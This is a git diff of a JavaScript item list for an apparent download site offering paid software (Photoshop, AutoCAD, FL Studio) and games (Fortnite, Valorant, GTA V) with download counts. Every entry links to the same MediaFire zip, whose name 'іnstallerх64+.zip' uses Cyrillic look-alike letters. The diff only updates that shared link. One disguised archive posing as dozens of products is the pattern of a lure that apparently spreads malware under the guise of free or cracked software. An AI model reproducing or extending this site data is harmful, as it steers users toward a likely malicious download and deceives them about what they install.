@@ -8,79 +8,79 @@ export const ItemsList = [
         title: "Adobe Photoshop",
         downloadCount: "87.2K",
         src: "/icons/adobe-photoshop.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Adobe After Effect",
         downloadCount: "78.4K",
         src: "/icons/adobe-after-effects.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Adobe Illustrator",
         downloadCount: "56.2K",
         src: "/icons/adobe-illustrator.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Adobe Premiere Pro",
         downloadCount: "77.4K",
         src: "/icons/adobe-premiere-pro.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Adobe Lightroom",
         downloadCount: "36.5K",
         src: "/icons/adobe-lightroom.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Adobe Acrobat",
         downloadCount: "63.6K",
         src: "/icons/adobe-acrobat.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Wondershare Filmora",
         downloadCount: "77.2K",
         src: "/icons/WondershareFilmora.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Autodesk",
         downloadCount: "87.2K",
         src: "/icons/autodesk.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Autodesk Autocad",
         downloadCount: "23.7K",
         src: "/icons/autodesk-autocad.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Sony Vegas",
         downloadCount: "31.4K",
         src: "/icons/сони-вегас.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Cinema 4D",
         downloadCount: "15.2K",
         src: "/icons/cinema_4d.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "FL Studio",
         downloadCount: "101.2K",
         src: "/icons/fl-studio.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Spotify",
         downloadCount: "86.7K",
         src: "/icons/spotify.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       }
     ]
   },
@@ -92,61 +92,61 @@ export const ItemsList = [
         title: "Call of Duty: Warzone",
         downloadCount: "34.1K",
         src: "/icons/call-of-duty-warzone.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Fortnite",
         downloadCount: "42.7K",
         src: "/icons/fortnite.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Roblox",
         downloadCount: "95.1K",
         src: "/icons/roblox.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Apex Legends",
         downloadCount: "24.7K",
         src: "/icons/apex.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Genshin Impact",
         downloadCount: "103.4K",
         src: "/icons/genshin-impact.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Rainbow Six Siege",
         downloadCount: "47.9K",
         src: "/icons/rainbow-six.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "GTA V",
         downloadCount: "87.3K",
         src: "/icons/gta-5.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Rust",
         downloadCount: "16.4K",
         src: "/icons/rust.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Escape From Tarkov",
         downloadCount: "18.9K",
         src: "/icons/escape-from-tarkov.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       },
       {
         title: "Valorant",
         downloadCount: "11.7K",
         src: "/icons/valorant.png",
-        downloadLink: "https://download948.mediafire.com/uqw6xrmg6epg/qjwx964i95mrmq1/%D1%96nstaller%D1%8564+.zip"
+        downloadLink: "https://www.mediafire.com/file/ciqcily2y60pm6s/іnstallerх64+.zip/file"
       }
     ]
   }
